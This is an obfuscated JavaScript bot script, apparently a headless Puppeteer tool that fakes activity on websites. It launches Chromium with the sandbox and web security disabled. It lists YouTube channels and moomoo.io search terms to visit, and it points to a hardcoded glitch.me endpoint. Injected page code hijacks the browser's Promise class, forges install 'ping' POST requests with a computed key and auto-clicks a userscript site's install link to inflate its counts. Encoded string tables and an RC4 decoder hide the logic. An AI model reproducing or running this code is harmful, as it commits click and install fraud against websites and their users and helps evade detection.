              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * -0x1fca + 0x42e + 0x1bac; J < -0x170d + 0x2381 * -0x1 + 0x1 * 0x3ade; ++J)
                K = Q[J - (-0x6 * 0x5f6 + 0x21 * -0x118 + 0x1 * 0x47df)] ^ Q[J - (0x650 + 0x19b + -0x7e3)] ^ Q[J - (0x11b4 * -0x2 + 0x10b7 + 0x12bf * 0x1)] ^ Q[J - (-0x1 * 0x153e + 0x6a * 0x25 + 0x5fc)], Q[J] = K << -0x24b0 * -0x1 + 0xc92 * -0x1 + -0x181d | K >>> -0x3bf + 0x209 * 0x1 + -0x43 * -0x7;
              for (J = -0x5ed + -0x1 * -0x1154 + -0xb67; J < 0x26a4 + -0x61 * -0x33 + -0x39e3; J += 0x19c5 + -0xd2 * 0x1 + -0x18ee * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * 0x985 + -0x1 * -0x1305 + 0x98f | L >>> -0x11d9 + 0x90 + 0x8b2 * 0x2) + (M & N | ~M & O) + P + (0x22864e73 + 0x31f1db40 + 0x135432e * 0x5) + Q[J] << 0x9e3 + 0x199e + -0x2381) << 0x7 * 0x199 + -0x13b + -0x9ef | P >>> -0x6bd * 0x1 + -0x1 * 0x1e + -0x42 * -0x1b) + (L & (M = M << -0x6a6 * -0x2 + -0x1be3 + -0xf * -0xfb | M >>> -0x13 * -0xb7 + -0x161 * -0x10 + -0x23a3) | ~L & N) + O + (0x5f940d5f + 0x14a22e7f * 0x4 + -0x2 * 0x2bcd26e1) + Q[J + (-0x19f * 0x8 + -0x15d8 + 0x22d1)] << -0x1aea + -0x635 * -0x1 + 0x14b5) << 0x3 * -0x996 + -0x1 * 0x91 + -0x3ab * -0x8 | O >>> -0x79d + 0x1141 * -0x2 + 0x2f * 0xe6) + (P & (L = L << -0x2d5 * 0x2 + -0x1aaf + 0x2077 | L >>> -0x1d04 + 0x8b7 * -0x1 + -0x1 * -0x25bd) | ~P & M) + N + (-0x48cd * -0x861c + 0x860766 * 0xa5 + -0x1 * 0x22038f91) + Q[J + (-0x24d1 + -0x35 * -0x5e + -0x7f * -0x23)] << 0x15 * 0x18 + -0x1f02 + 0x1d0a) << 0x11d6 + -0x1079 + -0x158 | N >>> 0x22e2 + -0x14b9 + -0xe0e) + (O & (P = P << -0x2251 + 0xda7 * 0x2 + 0x721 | P >>> 0x4 * -0x1a0 + 0xec9 * 0x1 + -0xa3 * 0xd) | ~O & L) + M + (0x14c * -0x464e3c + -0x2c5ff089 + -0x1 * -0xe20fdff2) + Q[J + (-0x1364 + 0x15 * -0xeb + -0x1 * -0x26ae)] << -0x2210 + 0x3 * 0x151 + 0x1e1d) << 0x4 * 0x59f + 0x836 + 0x1ead * -0x1 | M >>> 0x605 + 0x4a2 * 0x7 + 0xc * -0x332) + (N & (O = O << -0x2 * 0xb76 + -0xa85 * -0x2 + -0x10 * -0x20 | O >>> 0x1e26 + 0x80c + -0x2630) | ~N & P) + L + (-0x8e792453 + 0x3deef78d + 0xab0ca65f) + Q[J + (-0x2 * 0x12d1 + -0xaa9 * -0x2 + 0x5 * 0x344)] << -0x3 * 0x469 + -0x4f * -0x9 + 0xa74, N = N << -0x2 * 0x5b1 + 0x17 * 0x157 + -0x1351 | N >>> 0x1bdf * 0x1 + 0x185a + -0x1 * 0x3437;
              for (; J < -0x1469 + 0x1 * 0x2012 + -0xb81; J += 0x6a3 * -0x3 + -0x1e7f + 0x326d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6 * 0x61a + 0x8e + 0x1 * 0x2413 | L >>> 0x2118 + -0x4 * -0x79a + -0x3f65) + (M ^ N ^ O) + P + (-0x4d4bb277 + 0x96aba213 + 0x1 * 0x2579fc05) + Q[J] << -0x21ba + 0xaf8 + 0xb61 * 0x2) << 0x146d + -0x218a + 0xd22 | P >>> -0x1b41 * 0x1 + 0x155e + 0x5fe) + (L ^ (M = M << -0x1886 + 0x342 + 0x142 * 0x11 | M >>> -0x1 * -0x20c9 + 0x234a + -0x4411) ^ N) + O + (0x1cd * -0x21664 + -0x2bec7087 + 0x9e88ae3c) + Q[J + (-0x238d * -0x1 + -0x1 * 0xa3 + 0x22e9 * -0x1)] << -0x1 * -0x10d7 + -0x1319 * 0x1 + 0x11 * 0x22) << -0xebb * 0x2 + 0x1 * -0x20f9 + 0x8ec * 0x7 | O >>> -0x2526 + -0xecb + 0x340c) + (P ^ (L = L << -0x6 * 0xdd + -0x25 * 0x72 + -0x15c6 * -0x1 | L >>> 0x24 * 0x67 + 0x253a + -0x19da * 0x2) ^ M) + N + (0xd43c2f29 + 0x28f07158 + -0x11ca569c * 0x8) + Q[J + (-0x37 * -0x2f + 0x1 * 0x1e7 + 0x133 * -0xa)] << -0xe32 * -0x1 + -0x1679 + 0xa3 * 0xd) << -0x5 * -0x2ef + 0x3fb + 0xfb * -0x13 | N >>> 0x1 * 0x219b + 0x1 * 0x1d93 + 0x3f13 * -0x1) + (O ^ (P = P << 0x2672 + 0x9 * 0x4b + -0x1 * 0x28f7 | P >>> 0x2e2 + -0x2c * 0x8e + 0x6a * 0x34) ^ L) + M + (-0xda596a03 * -0x1 + 0x8a8cdef1 + 0xf60c5d53 * -0x1) + Q[J + (-0x1e4f + 0x33f * 0x1 + -0x1 * -0x1b13)] << -0x1727 * 0x1 + 0x22fc + 0x1 * -0xbd5) << 0x2673 + 0x25 * -0x15 + -0xdd * 0x29 | M >>> 0x1c51 * 0x1 + -0x11d1 * -0x1 + 0x1 * -0x2e07) + (N ^ (O = O << -0x3 * 0xb5f + 0x5 * -0x5c5 + 0x3f14 | O >>> -0xafc + -0x21e * 0x7 + 0x2 * 0xce8) ^ P) + L + (-0x34 * -0x3b1ca15 + 0x14 * -0x734053e + 0x3ecd4835 * 0x1) + Q[J + (0x3 * 0x41b + 0xbc * -0x35 + 0x1a9f)] << 0x1 * 0x860 + -0x3 * -0x95c + 0x1 * -0x2474, N = N << 0x13 * 0x76 + -0xe3 * 0x1d + 0x8d * 0x1f | N >>> -0x4 * -0x979 + -0x9a7 * -0x2 + 0x262 * -0x18;
              for (; J < 0x2c9 + -0xd83 + 0xaf6; J += 0x1e97 + -0x6e6 + -0x17ac)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4d3 + -0x1c08 + 0x173a | L >>> -0x12ed * -0x2 + 0x1 * 0xdff + -0x33be) + (M & N | M & O | N & O) + P - (0x358db53f + 0x3f58b211 + -0x402242c) + Q[J] << -0x8 * -0x92 + 0x43b + -0x8cb) << -0x1a07 * 0x1 + -0x13 * 0x1b + 0x1 * 0x1c0d | P >>> 0x1ab * 0x11 + 0x1daa * 0x1 + 0x7 * -0x846) + (L & (M = M << 0x10b1 + -0x1 * 0x1319 + 0x286 | M >>> 0x263c + -0x1ee * -0xd + 0x10 * -0x3f5) | L & N | M & N) + O - (-0xb4f9318a + 0x2a11 * 0x2d70a + 0xae658904) + Q[J + (-0x1 * -0x35 + 0xd5f + -0x1 * 0xd93)] << -0x2 * 0xfab + -0xf31 + 0x2e87) << -0x54 * -0x51 + -0x679 * 0x1 + 0x1416 * -0x1 | O >>> -0x10a4 + 0x1f * -0x6e + 0x1e11) + (P & (L = L << -0x123 + 0x12de + -0x119d | L >>> -0x44a * 0x6 + 0xc92 + -0x34b * -0x4) | P & M | L & M) + N - (-0x2651da93 * 0x1 + 0x922c627 * 0xb + 0x2686ea * 0x151) + Q[J + (0xf8 * -0x1d + 0x15fe + 0x61c)] << -0x1e0b + -0x200f + 0x1 * 0x3e1a) << 0x141b + -0x2503 + -0x7 * -0x26b | N >>> -0x55 * -0x3d + 0x1eb5 + 0x2f * -0x115) + (O & (P = P << -0x2111 * 0x1 + -0x1558 + -0x122d * -0x3 | P >>> -0x2276 + 0x10d5 + 0x11a3) | O & L | P & L) + M - (-0x1a75c99 * 0x5 + 0x1 * -0x3b4d2b7d + 0xb4763d9e) + Q[J + (-0x229b + 0x2513 * 0x1 + 0x1 * -0x275)] << -0xa87 + -0x9c0 + -0x1 * -0x1447) << -0x76e + 0x2 * -0xd06 + 0x23 * 0xf5 | M >>> -0x9e * -0x7 + -0x3ce + -0x69) + (N & (O = O << 0xbe1 + -0xa62 + -0x161 | O >>> -0x1 * 0x228b + -0x2131 * -0x1 + 0x2 * 0xae) | N & P | O & P) + L - (0x3a17ff * -0xde + -0x3 * -0x2972e707 + -0x1099 * -0x25859) + Q[J + (-0xec3 + 0x1379 + -0x1 * 0x4b2)] << 0x1ca2 + -0x13c2 + -0x238 * 0x4, N = N << 0xff9 + -0x45d * -0x8 + -0x1 * 0x32c3 | N >>> -0x2249 + 0x23ca * 0x1 + -0x17f * 0x1;
              for (; J < 0x89e + 0x1fe5 + -0x29 * 0xfb; J += -0x16d6 + 0x2 * -0x325 + 0x1d25)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3 * -0xb3a + -0x12fa + 0x34ad | L >>> -0x1 * -0x685 + 0x1 * -0x1c82 + 0x1618) + (M ^ N ^ O) + P - (0x1c7a * -0x33caf + 0x555a69b2 + -0x42fb72 * -0xe7) + Q[J] << 0xdb7 + -0x252d + -0x2a * -0x8f) << -0x1 * 0x1a3d + -0x17 * 0x14e + -0x3844 * -0x1 | P >>> 0x2596 + -0x2a7 + 0x2e7 * -0xc) + (L ^ (M = M << 0x1be1 + -0x2b7 * -0xc + -0x3c57 | M >>> -0x3 * 0x734 + 0x1d85 + -0x7 * 0x121) ^ N) + O - (-0x42ee898b * 0x1 + -0x19 * -0x283609a + 0x39b758ab) + Q[J + (0xde5 + -0x673 * 0x4 + 0xbe8)] << -0x221 * -0x5 + 0xd6f + 0x43 * -0x5c) << 0x1ae5 + 0x48c * 0x4 + -0x19c * 0x1c | O >>> -0x5ff + 0x1032 + -0xa18) + (P ^ (L = L << 0x822 * 0x1 + 0x18ee + -0x20f2 | L >>> -0x1b3d + -0x20f0 + -0x7 * -0x899) ^ M) + N - (0x4cee9d0 + 0x504be3e3 + 0x1f7d8f89 * -0x1) + Q[J + (0x2352 + 0xe74 + 0x31c4 * -0x1)] << -0x8ea * 0x2 + -0xe5c + 0x2030) << 0x3 * 0x873 + -0x5cc + -0x1388 | N >>> 0x2 * 0x3aa + -0x1595 + 0xe5c) + (O ^ (P = P << -0x11 * 0xdc + -0x18e7 + 0x5 * 0x7ed | P >>> -0x399 * -0x5 + 0x45c * 0x5 + -0x27c7) ^ L) + M - (0x1b3a8e8 * 0x26 + 0x1db5a3a8 + -0x527 * 0x7e962) + Q[J + (-0xd06 * 0x1 + 0x191 * -0x6 + 0x166f)] << -0x1d0 * -0x7 + -0x38f + 0x3 * -0x30b) << -0xbb9 * 0x2 + -0x35 * 0x4d + 0x2768 | M >>> -0x47e * -0x2 + -0xca * -0xe + -0x13ed * 0x1) + (N ^ (O = O << 0xd * -0x2ff + 0xb8a + -0xf3 * -0x1d | O >>> 0x1a1 * -0xf + 0x257f + -0xd0e) ^ P) + L - (0x2a79da55 + 0x1affe9eb * -0x3 + 0x5c232196) + Q[J + (0xb0f * -0x1 + 0x236b + 0x98 * -0x29)] << 0x25bf + 0x958 + -0x5 * 0x96b, N = N << 0x90f * 0x2 + -0x1 * 0xaf5 + 0x1 * -0x70b | N >>> 0x2 * -0x53 + -0x1b42 + 0x31a * 0x9;
              this['h0'] = this['h0'] + L << -0x1a2d * 0x1 + -0x1a8b + 0x34b8, this['h1'] = this['h1'] + M << 0x208a + 0x24c + -0x22d6, this['h2'] = this['h2'] + N << -0xd * -0x165 + 0x1945 + -0x2b66, this['h3'] = this['h3'] + O << 0x963 * 0x1 + 0x11f * 0x7 + 0x1 * -0x113c, this['h4'] = this['h4'] + P << 0x19aa + 0x1 * 0x1627 + -0x2fd1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1 * 0x18f3 + -0x4db + -0x2 * -0xef5 & -0xc6f * 0x3 + -0x5 * 0xb9 + 0x28f9] + w[J >> 0x23b8 + -0x1 * -0x2051 + -0x43f1 & 0x1e8f + -0xf69 + -0xf17] + w[J >> -0x122f + -0x245f + -0x14d * -0x2a & -0x1 * -0x2011 + 0xa23 + -0x2a25] + w[J >> -0x3 * -0x8f9 + 0x5a9 + -0x1 * 0x2084 & -0x9a7 * 0x3 + -0xc * -0x33b + 0x3 * -0x340] + w[J >> -0x3b2 + -0xb05 + 0xec3 & -0x1586 + -0x1 * 0x96 + 0x162b] + w[J >> -0xfd3 + 0x1146 + -0xb * 0x21 & 0xdcb + 0x1 * -0xa5b + -0x361] + w[J >> -0x67b + 0x13fa + -0xd7b & 0x5a7 + -0x20f + -0x389] + w[0xa86 + 0x1566 + 0x1fdd * -0x1 & J] + w[K >> 0x1 * -0x1fff + 0x200b * 0x1 + 0x10 & -0x171b + 0x1fcd * -0x1 + 0x36f7] + w[K >> 0xa * 0x125 + -0x1 * -0x1336 + -0x1e90 & -0x41 * 0x71 + 0x50 * 0x13 + 0x5 * 0x490] + w[K >> 0x3a1 * -0xa + -0x1f66 + 0x4 * 0x10f1 & 0x1cff + -0x14 * -0x18 + -0x1ed0] + w[K >> -0x151a * 0x1 + 0x1 * -0x1c9d + 0x31c7 & -0x1 * 0xdee + -0xe5 * 0xe + 0xb * 0x269] + w[K >> 0x5f * -0x35 + -0x868 + -0x139 * -0x17 & -0x1 * -0x129d + -0x1901 + 0x673] + w[K >> -0x1f5c + -0x1a35 * -0x1 + 0x52f & -0x1c * -0x10d + -0x1b9a + -0x1c3] + w[K >> -0x1d2a + 0x1ba4 + 0x18a & 0x9 * -0x153 + 0x6 * -0x13f + 0x9ba * 0x2] + w[-0x1180 * 0x1 + 0x9 * -0x259 + 0x26b0 & K] + w[L >> 0x185b + -0x75e + -0x10e1 & 0x5 * 0x6bb + 0xbe0 + -0x5af * 0x8] + w[L >> 0xce7 + -0x96 * -0x7 + 0x6f * -0x27 & -0x1 * 0x1e34 + -0x26f5 + 0x4538] + w[L >> -0xf37 + 0x8b9 + -0x692 * -0x1 & -0x8 * 0x455 + 0x596 * 0x2 + 0x178b] + w[L >> 0xafa * -0x2 + -0x1e81 + 0x3485 & 0x683 * -0x1 + -0x797 * 0x1 + 0xe29 * 0x1] + w[L >> -0x1 * 0x18df + -0x1505 * -0x1 + 0x3e6 & -0x509 * 0x4 + -0x26d + 0x16a0] + w[L >> -0x20d0 + -0xa * 0xbc + 0x2830 * 0x1 & 0x3 * 0x4b1 + -0x3fd + -0xa07] + w[L >> 0x1ad8 + -0x44 * -0x6d + -0x37c8 & -0x14 * -0x127 + 0x12b6 + -0x29b3 * 0x1] + w[0x3 * 0x1dd + 0x652 + 0x52 * -0x25 & L] + w[M >> -0x81a + 0x1 * -0x158e + 0x1dc4 & -0x1901 + -0x16f8 + 0x1 * 0x3008] + w[M >> -0xed5 * 0x2 + -0x936 + 0x26f8 & 0x1558 + 0xb70 * 0x3 + -0x3799] + w[M >> -0x17d5 + -0x3 * -0x9eb + -0x5d8 & 0x23e + -0x1d * -0x79 + 0x71 * -0x24] + w[M >> 0x2407 + -0x1637 + -0xdc0 & -0x3 * -0xca + 0x1adb + -0x2 * 0xe95] + w[M >> 0x181a + 0xee9 * -0x1 + 0x925 * -0x1 & 0x50 * 0x19 + 0xb1 * 0x1d + -0x2 * 0xde7] + w[M >> 0x22ef + -0xc * -0x207 + -0x101 * 0x3b & -0x1835 + 0x26f * 0xb + 0x281 * -0x1] + w[M >> -0x69d + 0x8bf * 0x2 + -0xadd & -0xe24 * -0x1 + 0x102 + -0xf17] + w[-0x967 + -0x1 * -0x279 + 0x1 * 0x6fd & M] + w[N >> -0x8 * 0x247 + 0x3e * -0x92 + -0x35b * -0x10 & 0x1eeb * -0x1 + -0x3fa + -0x22f4 * -0x1] + w[N >> -0x1399 + 0x1efc + -0xb4b * 0x1 & -0x1980 + -0x720 + 0x20af * 0x1] + w[N >> -0x6e3 + -0x23f3 + 0x6 * 0x727 & -0xdf1 + 0x22 + 0xdde] + w[N >> 0x3c2 * 0x3 + -0x4a * -0x6b + -0x2a24 & -0x588 + -0x194a + -0x5d * -0x55] + w[N >> 0x2f8 + -0xe19 + 0xb2d * 0x1 & -0x1114 + -0x25bc + 0x36df] + w[N >> -0x1d2b + 0xb9d + -0x1 * -0x1196 & -0x170c + 0x38d + 0x138e] + w[N >> 0x175 + 0x26f8 + -0x5 * 0x815 & -0x3e * -0x1f + -0x1e14 + 0x16a1 * 0x1] + w[0x17 * 0xa6 + 0xd * -0xdf + 0x4 * -0xe2 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1c8d + 0x1f9 * 0x1 + -0xd56 * -0x2 & -0x128b + -0x7d1 + 0x1b5b * 0x1,
                J >> -0x18b * 0x9 + 0x2f3 * 0x3 + -0x51a * -0x1 & 0x2049 + 0x22b9 + -0x4203,
                J >> -0x2600 + 0x2f * 0x65 + -0x3 * -0x67f & -0x6 * -0x1eb + -0xb91 + -0x2 * -0x87,
                0x9ad + 0xb0f + -0x13bd & J,
                K >> -0x22b7 + 0x26e3 * -0x1 + 0x49b2 & 0x435 + -0x1724 + 0x13ee,
                K >> 0x1 * 0x767 + -0x1a3 * -0x1 + -0x8fa & 0x1 * 0x40d + -0x1 * 0xbf5 + 0x8e7,
                K >> -0x1d37 + -0x12b2 + 0x3 * 0xffb & -0x1619 * 0x1 + 0x93e + 0xdda,
                0x8f * 0x35 + 0x6d5 + -0x2371 & K,
                L >> 0xc8a + 0x22fc + -0x2f6e & 0x1fd0 + 0x1b5d + -0x1d17 * 0x2,
                L >> -0x156e + 0x14b0 + 0xce & 0x1 * 0x2 + 0x157a * -0x1 + 0x1677 * 0x1,
                L >> -0x26d3 + -0x1101 + 0x2c * 0x145 & 0xd26 + 0x24d2 + 0x3 * -0x1053,
                0x8ee + -0x1 * 0x179f + 0xfb0 & L,
                M >> -0x17a3 + 0x110f + 0x6ac & -0x201f + 0x17b6 + 0x7 * 0x158,
                M >> 0x193f + 0x4fb + -0x1e2a & 0x14ba + 0x17f9 + -0x2bb4 * 0x1,
                M >> -0x12f + 0xbdc + -0xaa5 & -0x29 * 0xf1 + 0x2a1 * -0x1 + 0x2a39,
                -0x4ee * -0x5 + -0x1 * 0x216b + 0x9c4 & M,
                N >> 0x14ac + -0x1451 + -0x43 * 0x1 & -0x1 * -0x9ec + 0xdb5 * -0x1 + 0x4c8,
                N >> 0x147 * 0xc + -0x2036 + 0x10f2 & -0x1d0 + 0x1e7 * 0x3 + -0x2e6,
                N >> 0x4 * 0x817 + -0xd34 + -0x1320 & 0xffd * 0x1 + 0x1 * 0x183b + -0x2739,
                0x1cf3 + -0x35 * -0x13 + -0x1fe3 * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2 * -0x1202 + -0x5bd + 0x29d5), (K = new DataView(J))['setUint32'](-0xc72 + 0xb7 * 0x11 + -0x5 * -0xf, this['h0']), K['setUint32'](0x196e + -0xd * 0x6f + -0x13c7, this['h1']), K['setUint32'](0x11d * 0x2 + -0x1a6d + 0x183b, this['h2']), K['setUint32'](-0x2 * -0x11cf + -0x1 * -0x2023 + -0x43b5, this['h3']), K['setUint32'](0x2363 * -0x1 + 0xe5d * -0x2 + 0x1 * 0x402d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xecd * -0x1 + -0xfe8 + 0x1 * 0x11b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            const Z = c;
            let K = -0x2229 + -0x145c + -0x1 * -0x3685;
            J[0xae5 + 0x10d9 * 0x1 + -0x1bbe]['toString']()['includes'](Z(0x19) + 'te(\x22data-p' + 'ing-url') && (J[-0x87 * -0x8 + -0x4 * 0x740 + 0x18c8] = L => {
              const a0 = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te'](a0(0xd) + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x125b + 0x15b3 + -0x280d), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x27f + 0xa3 * 0x5 + -0x5 * 0x23;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1 * -0x241d + -0x1682 + 0x3 * -0x295), Promise['resolve'](0x237f + 0xf1e + -0x329c);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s[a1(0x10)](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1a15 + -0xd64 + -0xcb1; j < -0x1 * 0x61b + 0x11 * -0x4b + 0xb17; j++)
    i();
}
const NETWORK_PATIENCE = -0x6f7 * 0x1 + 0x1bc4 * -0x1 + 0x41fb + (0x1 * -0x10c + -0x2259 + 0x2f1d) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1f3 * -0x5 + -0x90e + -0xae) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + a2(0xf) + 'com/@jacks' + 'films',
    a3(0x8, 'h)LH') + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  const a4 = b;
  Array[a4(0x5, 'vs^x')]['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1de7 + -0x1579 + 0x437 * -0x2; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const a5 = b;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j[a5(0xa, 'V)Q5')](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function a() {
  const bt = [
    'ec-touch-f',
    'W7RcMmk1eqdcLmoKkmoApq',
    'W58Pm1XCW6NdKaa',
    'gmkWzCotWONdG8o5W4pdQLq',
    'q0nFW6RdMCkyFCkcCYa',
    'WQxcNsZcSYxdJtHyW7y',
    'torAll',
    '-become-pr',
    'hSoKCmonWP7dMCk1WOddTea',
    'ial_sharin',
    'W6e/WOxdRW0',
    'io\x20game',
    'click',
    'zgf0ys1PCc1Hza',
    'WR7dNSoQW50XW6NcRCoKpCoj',
    'DY55B3v0DwjLlG',
    'close',
    'Ahr0Chm6lY9NCG',
    'rg/en/scri',
    'W7dcMmktjW/cTSkYfmoXaq',
    '-ix4OizkAn',
    'z2v0',
    'BSoHFCoc',
    'Ag9VBcWXmdaGza',
    'r0XBW67dL8kZAmkdosa',
    'z2v0qxr0CMLIDq'
  ];
  a = function() {
    return bt;
  };
  return a();
}
let searchTerms = [];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1f2a + -0x226a + -0xaee * -0x6);
    let h = e[f];
    if (b['ZHEgDF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1bf7 + 0x1bfa + 0x3 * -0x1, s, t, u = 0x9 * 0x171 + -0x1b16 + 0xe1d; t = n['charAt'](u++); ~t && (s = r % (-0x11cf + 0xc9e + -0x535 * -0x1) ? s * (-0x2 * 0xa2a + 0x97 * 0x3b + 0x14b * -0xb) + t : t, r++ % (0x2521 + -0x2237 + -0x2e6 * 0x1)) ? p += String['fromCharCode'](-0x1477 + 0x1368 + 0x20e & s >> (-(-0x1a17 + 0x378 + 0x16a1) * r & 0x1c84 * 0x1 + -0x1 * 0xd85 + -0xef9 * 0x1)) : 0x22d * -0x5 + -0x675 + 0x1156) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2 * 0x1019 + 0xe * -0x26b + 0x1a8, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x687 * 0x5 + -0x25b5 + -0x8 * -0x8cd))['slice'](-(-0x831 + 0x1 * 0xe35 + -0x602));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x3e8 * -0x3 + -0x90d * -0x3 + 0xf6f * -0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x5 * 0x19f + -0x25 * 0x85 + 0x58f * 0x2; u < 0x21f0 + 0x76 + -0xb22 * 0x3; u++) {
          p[u] = u;
        }
        for (u = 0x78 * -0x10 + -0x2c * 0x2c + 0xf10 * 0x1; u < 0x10e5 + -0x1 * 0x247c + 0x1497; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x3 * -0x34b + 0xf98 + -0x5 * 0x4e5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x80a + 0x10 * 0x1d1 + 0x3 * -0xc5e, q = -0x1f8c + -0x1 * -0x1b6f + 0x1b * 0x27;
        for (let v = 0x17 * 0x7 + 0x25bc + -0x265d; v < n['length']; v++) {
          u = (u + (0x1c7f + -0x62 * 0x3b + -0x5e8)) % (-0x6a7 + 0x493 * 0x5 + -0xf38), q = (q + p[u]) % (-0x4c4 * -0x6 + -0x8ef + -0x12a9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x63a + -0x63f * -0x2 + -0x544)]);
        }
        return t;
      };
      b['hUHDEp'] = m, c = arguments, b['ZHEgDF'] = !![];
    }
    const j = e[0x97e + 0xd * -0x2ff + 0x1d75],
      k = f + j,
      l = c[k];
    return !l ? (b['DRCcfZ'] === undefined && (b['DRCcfZ'] = !![]), h = b['hUHDEp'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 